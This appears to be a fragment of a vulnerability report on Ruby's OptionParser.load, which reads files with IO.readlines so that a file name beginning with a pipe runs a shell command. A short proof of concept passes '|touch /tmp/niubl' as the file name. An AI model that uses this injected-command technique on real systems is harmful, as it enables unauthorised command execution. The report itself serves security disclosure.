  "vulnerability_information": "OptionParser.load function use IO.readlines to read file, which can inject `| command ` to exec command. \npoc:\n```\nrequire 'optparse'\n\nOptionParser.new do |opts|\n  opts.load(\"|touch /tmp/niubl\")\nend.parse!\n```\n\n## Impact\n\nThe command may be executed unintentionally.",
